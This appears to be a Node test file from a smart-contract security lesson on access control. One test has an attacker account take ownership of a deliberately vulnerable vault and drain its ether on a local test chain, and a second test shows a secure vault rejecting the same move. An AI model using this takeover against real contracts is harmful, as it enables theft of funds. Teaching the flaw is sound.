"use strict";
const { test } = require("node:test");
const assert = require("node:assert/strict");
const path = require("path");
const { compile, freshChain, deploy, ethers } = require("../lib/evm");

const contracts = compile(path.join(__dirname, "../contracts/02-access-control/AccessControl.sol"));
const E = ethers.parseEther.bind(ethers);

async function setup(name) {
  const { provider, signers } = await freshChain();
  const [deployer, , attackerEOA] = signers;
  const vault = await deploy(contracts, name, deployer);
  await (await vault.connect(deployer).deposit({ value: E("5") })).wait();
  return { provider, vault, deployer, attackerEOA };
}

test("anyone can seize ownership of VulnerableVault and drain it", async () => {
  const { provider, vault, attackerEOA } = await setup("VulnerableVault");
  await (await vault.connect(attackerEOA).changeOwner(await attackerEOA.getAddress())).wait();
  assert.equal(await vault.owner(), await attackerEOA.getAddress(), "attacker is now owner");
  const before = await provider.getBalance(await attackerEOA.getAddress());
  await (await vault.connect(attackerEOA).withdrawAll()).wait();
  assert.equal(await vault.balance(), 0n, "vault drained");
  assert.ok(await provider.getBalance(await attackerEOA.getAddress()) > before, "attacker gained the funds");
});

test("SecureVault blocks the ownership takeover", async () => {
  const { vault, deployer, attackerEOA } = await setup("SecureVault");
  await assert.rejects(
    vault.connect(attackerEOA).changeOwner(await attackerEOA.getAddress()),
    "changeOwner must revert for a non-owner",
  );
  assert.equal(await vault.owner(), await deployer.getAddress(), "owner unchanged");
  assert.equal(await vault.balance(), E("5"), "funds intact");
});
